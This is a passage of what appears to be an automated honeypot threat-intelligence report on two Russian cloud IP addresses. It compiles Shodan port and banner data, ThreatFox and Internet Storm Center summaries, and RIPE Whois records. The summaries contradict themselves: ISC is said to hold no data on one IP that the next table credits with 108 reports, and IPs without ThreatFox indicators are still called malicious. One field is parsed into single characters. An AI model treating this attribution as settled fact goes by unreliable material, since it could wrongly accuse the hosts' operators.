| 22 | tcp | OpenSSH7.4 | 2024-01-17T22:17:51.407573 |

#### Port 22 (tcp): OpenSSH7.4

<details>
<summary>
<h4>Raw Service Data for Port 22 (tcp): OpenSSH7.4</h4>
</summary>


````
SSH-2.0-OpenSSH_7.4
Key type: ssh-rsa
Key: AAAAB3NzaC1yc2EAAAADAQABAAABAQDM9rKMFJvFd/J/eorP49OYaHAS//dkzANALQGeKbNXF27y
Y3rVZfdef2hWAv4qaVsJTX5Dbf2EOaYIyzaRM7EEOPWnK6YoIdYCGHmYOxvhyiGGneEPhfqGSPbI
PdQaqqbwB98UW03ncKVjSGIOFK6Gur0xXQFESmnCcifv3lYtElpnk0q+C0/9bvDIQS92VBLdPk+y
ZPgc0nU651vOqvhKck/dsPqjQdHGoyTN1fkMh3at/3lkolGY1wdDEPdd6OwobxEDAki1kLH16pkG
KTQ9gm5qM/17imLw77fx2Grlxb2j+qpSrKxmpuI25MCGv1NP9gcSfCZwLCQKks0+d6kB
Fingerprint: ce:2f:14:9c:21:8c:b1:06:1f:4e:5d:d8:d3:31:e6:25

Kex Algorithms:
	curve25519-sha256
	curve25519-sha256@libssh.org
	ecdh-sha2-nistp256
	ecdh-sha2-nistp384
	ecdh-sha2-nistp521
	diffie-hellman-group-exchange-sha256
	diffie-hellman-group16-sha512
	diffie-hellman-group18-sha512
	diffie-hellman-group-exchange-sha1
	diffie-hellman-group14-sha256
	diffie-hellman-group14-sha1
	diffie-hellman-group1-sha1

Server Host Key Algorithms:
	ssh-rsa
	rsa-sha2-512
	rsa-sha2-256
	ecdsa-sha2-nistp256
	ssh-ed25519

Encryption Algorithms:
	chacha20-poly1305@openssh.com
	aes128-ctr
	aes192-ctr
	aes256-ctr
	aes128-gcm@openssh.com
	aes256-gcm@openssh.com
	aes128-cbc
	aes192-cbc
	aes256-cbc
	blowfish-cbc
	cast128-cbc
	3des-cbc

MAC Algorithms:
	umac-64-etm@openssh.com
	umac-128-etm@openssh.com
	hmac-sha2-256-etm@openssh.com
	hmac-sha2-512-etm@openssh.com
	hmac-sha1-etm@openssh.com
	umac-64@openssh.com
	umac-128@openssh.com
	hmac-sha2-256
	hmac-sha2-512
	hmac-sha1

Compression Algorithms:
	none
	zlib@openssh.com
````

</details>

---


| Key | Value |
| --- | --- |
| sig | SSH-2.0-OpenSSH_7.4 |
| Key type | ssh-rsa |
| Key | AAAAB3NzaC1yc2EAAAADAQABAAABAQDM9rKMFJvFd/J/eorP49OYaHAS//dkzANALQGeKbNXF27yY3rVZfdef2hWAv4qaVsJTX5Dbf2EOaYIyzaRM7EEOPWnK6YoIdYCGHmYOxvhyiGGneEPhfqGSPbIPdQaqqbwB98UW03ncKVjSGIOFK6Gur0xXQFESmnCcifv3lYtElpnk0q+C0/9bvDIQS92VBLdPk+yZPgc0nU651vOqvhKck/dsPqjQdHGoyTN1fkMh3at/3lkolGY1wdDEPdd6OwobxEDAki1kLH16pkGKTQ9gm5qM/17imLw77fx2Grlxb2j+qpSrKxmpuI25MCGv1NP9gcSfCZwLCQKks0+d6kB |
| Fingerprint | ce:2f:14:9c:21:8c:b1:06:1f:4e:5d:d8:d3:31:e6:25 |
| Kex Algorithms | ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group-exchange-sha1', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1', 'diffie-hellman-group1-sha1'] |
| Server Host Key Algorithms | ['ssh-rsa', 'rsa-sha2-512', 'rsa-sha2-256', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] |
| Encryption Algorithms | ['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com', 'aes128-cbc', 'aes192-cbc', 'aes256-cbc', 'blowfish-cbc', 'cast128-cbc', '3des-cbc'] |
| MAC Algorithms | ['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] |
| Compression Algorithms | ['none', 'zlib@openssh.com'] |

</details>

---


<details>
<summary>
<h3>Shodan results for: 87.242.89.170</h3>
</summary>


### Shodan results for: 87.242.89.170 [https://www.shodan.io/host/87.242.89.170](https://www.shodan.io/host/87.242.89.170)

| Country | City | Organization | ISP | ASN |
| --- | --- | --- | --- | --- |
| Russian Federation | Moscow | Cloud Technologies LLC trading as Cloud.ru | "Cloud Technologies" LLC trading as Cloud.ru | AS208677 |

#### Open Ports

| Port | Protocol | Service | Update Time |
| --- | --- | --- | --- |
| 21 | tcp | unknown | 2024-01-08T10:44:37.498394 |
| 22 | tcp | OpenSSH7.4 | 2024-01-20T11:45:47.004445 |
| 80 | tcp | Apache httpd2.4.6 | 2024-01-20T03:39:29.136292 |

#### Port 21 (tcp): unknown

<details>
<summary>
<h4>Raw Service Data for Port 21 (tcp): unknown</h4>
</summary>


````
220 (vsFTPd 3.0.2)
230 Login successful.
214-The following commands are recognized.
 ABOR ACCT ALLO APPE CDUP CWD  DELE EPRT EPSV FEAT HELP LIST MDTM MKD
 MODE NLST NOOP OPTS PASS PASV PORT PWD  QUIT REIN REST RETR RMD  RNFR
 RNTO SITE SIZE SMNT STAT STOR STOU STRU SYST TYPE USER XCUP XCWD XMKD
 XPWD XRMD
214 Help OK.
211-Features:
 EPRT
 EPSV
 MDTM
 PASV
 REST STREAM
 SIZE
 TVFS
 UTF8
211 End
````

</details>

---


| Key | Value |
| --- | --- |
| sig | 220 (vsFTPd 3.0.2)230 Login successful.214-The following commands are recognized. ABOR ACCT ALLO APPE CDUP CWD  DELE EPRT EPSV FEAT HELP LIST MDTM MKD MODE NLST NOOP OPTS PASS PASV PORT PWD  QUIT REIN REST RETR RMD  RNFR RNTO SITE SIZE SMNT STAT STOR STOU STRU SYST TYPE USER XCUP XCWD XMKD XPWD XRMD214 Help OK. |
| 211-Features | [' ', 'E', 'P', 'R', 'T', ' ', 'E', 'P', 'S', 'V', ' ', 'M', 'D', 'T', 'M', ' ', 'P', 'A', 'S', 'V', ' ', 'R', 'E', 'S', 'T', ' ', 'S', 'T', 'R', 'E', 'A', 'M', ' ', 'S', 'I', 'Z', 'E', ' ', 'T', 'V', 'F', 'S', ' ', 'U', 'T', 'F', '8', '2', '1', '1', ' ', 'E', 'n', 'd'] |

#### Port 22 (tcp): OpenSSH7.4

<details>
<summary>
<h4>Raw Service Data for Port 22 (tcp): OpenSSH7.4</h4>
</summary>


````
SSH-2.0-OpenSSH_7.4
Key type: ssh-rsa
Key: AAAAB3NzaC1yc2EAAAADAQABAAABAQDPOuKImYTqlZRogaWmuvjRxTlIk61I+YKdpFyESTW2BP1j
k6xAxhFgu5EnKKqG+Me1m3Nxo+1rd59DWORwWPNn4dPoI1FgD8g4BCGw5t0b67IofEWGfX4smO4h
LAtnH3PISFaMrFEJhVoudx+DATi9RpK5peSddWt13yhQM0tCAc1yoL+z2goAcHqC0BAuuK/WNRGw
gjUu/xEcaxaW6LBNGaVWpq/0keYKfrTP4FZ8hnb49Jh3hYMd7QVOmhe89aed1/hYY+/ETk/u5Zyc
jZ0E0crhgZ+CD34SCLBRrVCGtwANRBmR3UIrRpI5wEIt7LDg43Pr8l7hCiPCD9FGbIKv
Fingerprint: 32:ee:35:40:cb:62:57:d8:0e:8c:c5:f3:d0:a8:33:58

Kex Algorithms:
	curve25519-sha256
	curve25519-sha256@libssh.org
	ecdh-sha2-nistp256
	ecdh-sha2-nistp384
	ecdh-sha2-nistp521
	diffie-hellman-group-exchange-sha256
	diffie-hellman-group16-sha512
	diffie-hellman-group18-sha512
	diffie-hellman-group-exchange-sha1
	diffie-hellman-group14-sha256
	diffie-hellman-group14-sha1
	diffie-hellman-group1-sha1

Server Host Key Algorithms:
	ssh-rsa
	rsa-sha2-512
	rsa-sha2-256
	ecdsa-sha2-nistp256
	ssh-ed25519

Encryption Algorithms:
	chacha20-poly1305@openssh.com
	aes128-ctr
	aes192-ctr
	aes256-ctr
	aes128-gcm@openssh.com
	aes256-gcm@openssh.com
	aes128-cbc
	aes192-cbc
	aes256-cbc
	blowfish-cbc
	cast128-cbc
	3des-cbc

MAC Algorithms:
	umac-64-etm@openssh.com
	umac-128-etm@openssh.com
	hmac-sha2-256-etm@openssh.com
	hmac-sha2-512-etm@openssh.com
	hmac-sha1-etm@openssh.com
	umac-64@openssh.com
	umac-128@openssh.com
	hmac-sha2-256
	hmac-sha2-512
	hmac-sha1

Compression Algorithms:
	none
	zlib@openssh.com
````

</details>

---


| Key | Value |
| --- | --- |
| sig | SSH-2.0-OpenSSH_7.4 |
| Key type | ssh-rsa |
| Key | AAAAB3NzaC1yc2EAAAADAQABAAABAQDPOuKImYTqlZRogaWmuvjRxTlIk61I+YKdpFyESTW2BP1jk6xAxhFgu5EnKKqG+Me1m3Nxo+1rd59DWORwWPNn4dPoI1FgD8g4BCGw5t0b67IofEWGfX4smO4hLAtnH3PISFaMrFEJhVoudx+DATi9RpK5peSddWt13yhQM0tCAc1yoL+z2goAcHqC0BAuuK/WNRGwgjUu/xEcaxaW6LBNGaVWpq/0keYKfrTP4FZ8hnb49Jh3hYMd7QVOmhe89aed1/hYY+/ETk/u5ZycjZ0E0crhgZ+CD34SCLBRrVCGtwANRBmR3UIrRpI5wEIt7LDg43Pr8l7hCiPCD9FGbIKv |
| Fingerprint | 32:ee:35:40:cb:62:57:d8:0e:8c:c5:f3:d0:a8:33:58 |
| Kex Algorithms | ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group-exchange-sha1', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1', 'diffie-hellman-group1-sha1'] |
| Server Host Key Algorithms | ['ssh-rsa', 'rsa-sha2-512', 'rsa-sha2-256', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] |
| Encryption Algorithms | ['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com', 'aes128-cbc', 'aes192-cbc', 'aes256-cbc', 'blowfish-cbc', 'cast128-cbc', '3des-cbc'] |
| MAC Algorithms | ['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] |
| Compression Algorithms | ['none', 'zlib@openssh.com'] |

#### Port 80 (tcp): Apache httpd2.4.6

<details>
<summary>
<h4>Raw Service Data for Port 80 (tcp): Apache httpd2.4.6</h4>
</summary>


````
HTTP/1.1 403 Forbidden
Date: Sat, 20 Jan 2024 03:39:29 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
Last-Modified: Thu, 16 Oct 2014 13:20:58 GMT
ETag: "1321-5058a1e728280"
Accept-Ranges: bytes
Content-Length: 4897
Content-Type: text/html; charset=UTF-8
````

</details>

---


| Key | Value |
| --- | --- |
| sig | HTTP/1.1 403 Forbidden |
| Date | Sat, 20 Jan 2024 03:39:29 GMT |
| Server | Apache/2.4.6 (CentOS) PHP/5.4.16 |
| Last-Modified | Thu, 16 Oct 2014 13:20:58 GMT |
| ETag | "1321-5058a1e728280" |
| Accept-Ranges | bytes |
| Content-Length | 4897 |
| Content-Type | text/html; charset=UTF-8 |

</details>

---


</details>

---


<details>
<summary>
<h2>ThreatFox</h2>
</summary>


### ThreatFox Results Summary
According to ThreatFox data, both IP addresses `87.242.92.23` and `87.242.89.170` are within the same network block and share similar information:

- Network Range: 87.242.84.0 - 87.242.95.255
- Netname: RU-CLOUDRU-20050722
- Country: Russia (RU)
- Organization: "Cloud Technologies" LLC trading as Cloud.ru
- Admin and Tech Contact: Use of role objects CLOUDRU_NETOPS and CLOUDRU_NETBUILD with an abuse mailbox at @cloud.ru
- Address: Vavilova Street, Moscow, Russian Federation
- ASN: AS208677
- Maintenance by: mnt-ru-sbercloud-1 and RIPE-NCC-HM-MNT

This information indicates that both IPs belong to the same organization and are associated with cloud service infrastructure in Russia. There are no specific indicators from ThreatFox that link these IP addresses to any reported malicious activities or malware; however, based on other context from the attack, these addresses are associated with malicious behavior.

</details>

---


<details>
<summary>
<h2>Internet Storm Center (ISC)</h2>
</summary>


### Internet Storm Center (ISC) [https://isc.sans.edu/ipinfo/](https://isc.sans.edu/ipinfo/)
Based on ISC (Internet Storm Center) data, here is what is known about the IP address `87.242.92.23` involved in the attack:

- Total Reports: 2 reports indication malicious activity
- Honeypots Targeted: 2 different honeypots have reported interactions with this IP
- Report Timelines: 
  - First seen interacting with honeypots on December 10, 2023
  - Last seen interacting with honeypots on December 16, 2023
- The IP is part of the network range: 87.242.88.0/21
- AS Name: CLOUDRU-AS
- Country Code: Russia (RU)

ISC data does not include information for the IP address `87.242.89.170`.

From the ISC information, it can be inferred that the IP `87.242.92.23` has shown malicious activities that have resulted in reports from honeypots. The IP belongs to the ASN of a Russian cloud service provider and has been actively interacting with honeypot sensors, indicating a possible threat actor.

* `2` of the `2` unique source IPs have reports on the Internet Storm Center (ISC).
* `110` total attacks were reported.
* `6` unique targets were attacked.
* The IP address with the **most reports** was `87.242.89.170` with `108` reports.
* The IP address with the **most targets** was `87.242.89.170` with `4` targets.
* The **first report** was on `2023-12-10` from `87.242.92.23`.
* The **most recent** was on `2023-12-16` from `87.242.92.23`.


| IP Address | Total Reports | Targets | First Report | Last Report | Update Time |
| --- | --- | --- | --- | --- | --- |
| 87.242.89.170 | 108 | 4 | 2023-12-13 | 2023-12-16 | 2023-12-17 04:06:24 |
| 87.242.92.23 | 2 | 2 | 2023-12-10 | 2023-12-16 | 2023-12-17 04:06:24 |

<details>
<summary>
<h4>Top 1 Asabusecontacts</h4>
</summary>

Total asabusecontacts: `2`
Unique: `1`

| asabusecontact | Times Seen |
| --- | --- |
| `ripesupport@sbercloud.ru` | `2` |

</details>

---


<details>
<summary>
<h4>Top 1 As</h4>
</summary>

Total ass: `2`
Unique: `1`

| as | Times Seen |
| --- | --- |
| `208677` | `2` |

</details>

---


<details>
<summary>
<h4>Top 1 Asnames</h4>
</summary>

Total asnames: `2`
Unique: `1`

| asname | Times Seen |
| --- | --- |
| `CLOUDRU-AS` | `2` |

</details>

---


<details>
<summary>
<h4>Top 1 Ascountrys</h4>
</summary>

Total ascountrys: `2`
Unique: `1`

| ascountry | Times Seen |
| --- | --- |
| `RU` | `2` |

</details>

---


<details>
<summary>
<h4>Top 1 Assizes</h4>
</summary>

Total assizes: `2`
Unique: `1`

| assize | Times Seen |
| --- | --- |
| `37120` | `2` |

</details>

---


<details>
<summary>
<h4>Top 1 Networks</h4>
</summary>

Total networks: `2`
Unique: `1`

| network | Times Seen |
| --- | --- |
| `87.242.88.0/21` | `2` |

</details>

---


<details>
<summary>
<h4>Top 1 Threatfeeds</h4>
</summary>

Total threatfeedss: `1`
Unique: `1`

| threatfeeds | Times Seen |
| --- | --- |
| `threatview` | `1` |

</details>

---


</details>

---


<details>
<summary>
<h2>Whois</h2>
</summary>


### Whois Results Summary

<details>
<summary>
<h3>Whois data for: 87.242.92.23</h3>
</summary>


### Whois data for: 87.242.92.23 [https://www.whois.com/whois/87.242.92.23](https://www.whois.com/whois/87.242.92.23)

````
% This is the RIPE Database query service.
% The objects are in RPSL format.
%
% The RIPE Database is subject to Terms and Conditions.
% See https://apps.db.ripe.net/docs/HTML-Terms-And-Conditions

% Note: this output has been filtered.
%       To receive output for a database update, use the "-B" flag.

% Information related to '87.242.84.0 - 87.242.95.255'

% Abuse contact for '87.242.84.0 - 87.242.95.255' is '@cloud.ru'

inetnum:        87.242.84.0 - 87.242.95.255
netname:        RU-CLOUDRU-20050722
country:        RU
org:            ORG-CTL61-RIPE
admin-c:        NA6889-RIPE
tech-c:         NA6888-RIPE
status:         ALLOCATED PA
mnt-by:         mnt-ru-sbercloud-1
mnt-by:         RIPE-NCC-HM-MNT
created:        2022-05-04T12:59:53Z
last-modified:  2023-07-25T09:19:30Z
source:         RIPE

organisation:   ORG-CTL61-RIPE
org-name:       "Cloud Technologies" LLC trading as Cloud.ru
country:        RU
org-type:       LIR
address:        PO Box 140
address:        123022
address:        Moscow
address:        RUSSIAN FEDERATION
phone:          +7 (495) 260-10-82
admin-c:        NA6889-RIPE
tech-c:         NA6888-RIPE
abuse-c:        AR53335-RIPE
mnt-ref:        mnt-ru-sbercloud-1
mnt-by:         RIPE-NCC-HM-MNT
mnt-by:         mnt-ru-sbercloud-1
created:        2019-06-20T07:22:48Z
last-modified:  2023-07-13T09:54:33Z
source:         RIPE # Filtered

role:           CLOUDRU_NETOPS
address:        ul. Vavilova, d. 23, stroen. 1 komn. 1.207
abuse-mailbox:  @cloud.ru
nic-hdl:        NA6888-RIPE
mnt-by:         mnt-ru-sbercloud-1
created:        2020-12-14T11:09:58Z
last-modified:  2023-07-03T09:25:46Z
source:         RIPE # Filtered

role:           CLOUDRU_NETBUILD
address:        ul. Vavilova, d. 23, stroen. 1 komn. 1.207
abuse-mailbox:  @cloud.ru
nic-hdl:        NA6889-RIPE
mnt-by:         mnt-ru-sbercloud-1
created:        2020-12-14T11:10:41Z
last-modified:  2023-07-03T09:24:28Z
source:         RIPE # Filtered

% Information related to '87.242.88.0/21AS208677'

route:          87.242.88.0/21
origin:         AS208677
mnt-by:         mnt-ru-sbercloud-1
created:        2022-05-05T14:15:23Z
last-modified:  2022-05-05T14:15:23Z
source:         RIPE

% This query was served by the RIPE Database Query Service version 1.109.1 (ABERDEEN)
````

</details>

---


<details>
<summary>
<h3>Whois data for: 87.242.89.170</h3>
</summary>


### Whois data for: 87.242.89.170 [https://www.whois.com/whois/87.242.89.170](https://www.whois.com/whois/87.242.89.170)

````
% This is the RIPE Database query service.
% The objects are in RPSL format.
%
% The RIPE Database is subject to Terms and Conditions.
% See https://apps.db.ripe.net/docs/HTML-Terms-And-Conditions

% Note: this output has been filtered.
%       To receive output for a database update, use the "-B" flag.

% Information related to '87.242.84.0 - 87.242.95.255'

% Abuse contact for '87.242.84.0 - 87.242.95.255' is '@cloud.ru'

inetnum:        87.242.84.0 - 87.242.95.255
netname:        RU-CLOUDRU-20050722
country:        RU
org:            ORG-CTL61-RIPE
admin-c:        NA6889-RIPE
tech-c:         NA6888-RIPE
status:         ALLOCATED PA
mnt-by:         mnt-ru-sbercloud-1
mnt-by:         RIPE-NCC-HM-MNT
created:        2022-05-04T12:59:53Z
last-modified:  2023-07-25T09:19:30Z
source:         RIPE

organisation:   ORG-CTL61-RIPE
org-name:       "Cloud Technologies" LLC trading as Cloud.ru
country:        RU
org-type:       LIR
address:        PO Box 140
address:        123022
address:        Moscow
address:        RUSSIAN FEDERATION
phone:          +7 (495) 260-10-82
admin-c:        NA6889-RIPE
tech-c:         NA6888-RIPE
abuse-c:        AR53335-RIPE
mnt-ref:        mnt-ru-sbercloud-1
mnt-by:         RIPE-NCC-HM-MNT
mnt-by:         mnt-ru-sbercloud-1
created:        2019-06-20T07:22:48Z
last-modified:  2023-07-13T09:54:33Z
source:         RIPE # Filtered

role:           CLOUDRU_NETOPS
address:        ul. Vavilova, d. 23, stroen. 1 komn. 1.207
abuse-mailbox:  @cloud.ru
nic-hdl:        NA6888-RIPE
mnt-by:         mnt-ru-sbercloud-1
created:        2020-12-14T11:09:58Z
last-modified:  2023-07-03T09:25:46Z
source:         RIPE # Filtered

role:           CLOUDRU_NETBUILD
address:        ul. Vavilova, d. 23, stroen. 1 komn. 1.207
abuse-mailbox:  @cloud.ru
nic-hdl:        NA6889-RIPE
mnt-by:         mnt-ru-sbercloud-1
created:        2020-12-14T11:10:41Z
last-modified:  2023-07-03T09:24:28Z
source:         RIPE # Filtered

% Information related to '87.242.88.0/21AS208677'

route:          87.242.88.0/21
origin:         AS208677
mnt-by:         mnt-ru-sbercloud-1
created:        2022-05-05T14:15:23Z
last-modified:  2022-05-05T14:15:23Z
source:         RIPE

% This query was served by the RIPE Database Query Service version 1.109.1 (DEXTER)
````

</details>

---


</details>

---

